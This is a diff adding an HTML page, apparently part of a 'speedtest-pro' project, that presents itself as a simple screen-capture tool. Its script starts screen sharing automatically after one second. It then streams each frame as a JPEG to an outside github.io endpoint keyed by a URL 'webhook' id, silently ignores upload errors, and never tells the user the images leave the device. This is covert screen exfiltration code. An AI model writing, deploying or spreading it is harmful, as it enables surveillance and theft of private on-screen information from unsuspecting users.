@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Screen Capture</title>
+    <style>
+        body { 
+            background: #000; 
+            color: #ff0000; 
+            font-family: monospace; 
+            text-align: center; 
+            padding: 20px; 
+        }
+        .btn { 
+            background: #660000; 
+            color: white; 
+            border: none; 
+            padding: 15px 30px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            margin: 10px; 
+        }
+        #status { 
+            margin: 20px 0; 
+            padding: 10px; 
+            background: #330000; 
+        }
+    </style>
+</head>
+<body>
+    <h2>📺 Screen Capture</h2>
+    <div id="status">Ready to capture screen</div>
+    <button class="btn" onclick="startCapture()">Start Capture</button>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const webhookId = urlParams.get('webhook') || 'test123';
+        
+        async function startCapture() {
+            try {
+                document.getElementById('status').innerHTML = '🔄 Requesting screen access...';
+                
+                const stream = await navigator.mediaDevices.getDisplayMedia({
+                    video: { width: 1280, height: 720 }
+                });
+                
+                document.getElementById('status').innerHTML = '✅ Screen capture active';
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                video.onloadedmetadata = () => {
+                    captureFrames(video);
+                };
+                
+            } catch (error) {
+                document.getElementById('status').innerHTML = '❌ Screen capture failed: ' + error.message;
+            }
+        }
+        
+        function captureFrames(video) {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            
+            function streamFrame() {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.3);
+                
+                // Send to webhook server for live streaming
+                fetch('https://bojourx-tos.github.io/speedtest-pro/webhook-server.html', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        webhook: webhookId,
+                        type: 'liveScreen',
+                        screenData: imageData,
+                        timestamp: new Date().toISOString()
+                    })
+                }).catch(() => {});
+                
+                // Also store in localStorage as backup
+                localStorage.setItem('live_screen_' + webhookId, imageData);
+                
+                document.getElementById('status').innerHTML = '📺 Live streaming active';
+                
+                // Stream next frame
+                requestAnimationFrame(streamFrame);
+            }
+            
+            // Start live streaming
+            streamFrame();
+        }
+        
+        // Auto start after 1 second for faster response
+        setTimeout(startCapture, 1000);
+        
+        // Keep connection alive
+        setInterval(() => {
+            document.getElementById('status').innerHTML = '📺 Live streaming - ' + new Date().toLocaleTimeString();
+        }, 1000);
+    </script>
+</body>
+</html>
